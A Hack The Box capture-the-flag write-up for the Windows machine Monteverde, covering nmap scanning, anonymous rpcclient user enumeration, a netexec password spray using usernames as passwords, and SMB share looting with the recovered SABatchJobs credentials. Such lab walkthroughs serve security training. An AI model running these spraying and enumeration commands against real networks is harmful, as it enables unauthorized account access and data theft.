---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags:
---

<br />

![1](../../../assets/images/Monteverde/1.png)

<br />

OS -> Windows.

Difficulty -> Medium.

<br />

# Introduction

<br />



<br />

# Enumeration

<br />

We begin with an aggressive `nmap` full TCP port scan to identify all open ports and enumerate services.

<br />

```bash
❯ nmap -p- 10.10.10.172 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 11:41 CEST
Nmap scan report for 10.10.10.172
Host is up (0.042s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 09:41:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1m14s
| smb2-time: 
|   date: 2025-07-18T09:42:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.76 seconds
```

<br />

Relevant Open Ports:

- `Port 53`   -> dns  

- `Port 88`   -> kerberos  

- `Port 135`  -> rpc  

- `Port 139`  -> netbios  

- `Port 389`  -> ldap  

- `Port 445`  -> smb  

- `Port 464`  -> kpasswd (kerberos password change)  

- `Port 593`  -> rpc over http  

- `Port 636`  -> ldaps  

- `Port 5985` -> winrm  

<br />

The Nmap script shows that the LDAP service reveals the domain name `MEGABANK.LOCAL`.

So we add them to our `/etc/hosts` file:

<br />

```bash
10.10.10.172 MEGABANK.LOCAL
```

<br />

# SMB Enumeration: -> Port 445

<br />

As always, we will start enumerating basic domain information with `netexec`:

<br />

```bash
❯ netexec smb 10.10.10.172
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

<br />

In the output, we can confirm the domain `MEGABANK.LOCAL` and that we're dealing with a Windows 10 Build 17763.

We attempt a null session (anonymous access) SMB connection to enumerate shares, but `STATUS_ACCESS_DENIED`:

<br />

```bash
❯ netexec smb MEGABANK.LOCAL -u '' -p '' --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

<br />

## Rpcclient

<br />

On the other hand, null session works for `rpcclient`:

<br />

```bash
❯ rpcclient -U "" MEGABANK.LOCAL -N
rpcclient $> 
```

<br />

Inside, we can enumerate the domain users with the command `enumdomusers`:

<br />

```bash
❯ rpcclient -U "" MEGABANK.LOCAL -N
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

<br />

Then, we put this `usernames` into a file:

<br />

```bash
❯ rpcclient -U "" MEGABANK.LOCAL -N -c "enumdomusers" | grep -oP "\[.*?\]" | grep -v "0x" | tr -d "[]" | sponge users.txt
❯ /usr/bin/cat users.txt
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

<br />

## SMB Spray Attack

<br />

At this point, we can attempt a Spray Attack with this usernames.

It may seem silly, but it is quite typical for a company user to use their nickname as a password.

To perform this attack, we will run `netexec` using the `--continue-on-success` flag. By this way, the program will continue running including after a valid match.

<br />

```bash
❯ netexec smb MEGABANK.LOCAL -u users.txt -p users.txt --continue-on-success
...[snip]...
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
...[snip]...

```

<br />

In this case, we only have one match:

But we have valid credentials: `SABatchJobs:SABatchJobs`

## SMB Authenticated Enumeration:

<br />

Enumerating the shares available for this user, we find the following:

<br />

```bash
❯ netexec smb MEGABANK.LOCAL -u SABatchJobs -p SABatchJobs --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ            
```

<br />

There are several relevant resources in the output, but the most interesting is the `users$` one.

To access it, we can use `smbcclient`:

<br />

```bash
❯ smbclient //MEGABANK.LOCAL/Users$ -U SABatchJobs
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 14:12:48 2020
  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
```

<br />

And download its content to our local machine for further analyze:

<br >

```bash
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \mhope\azure.xml of size 1212 as mhope/azure.xml (6,6 KiloBytes/sec) (average 6,6 KiloBytes/sec)
```

<br />


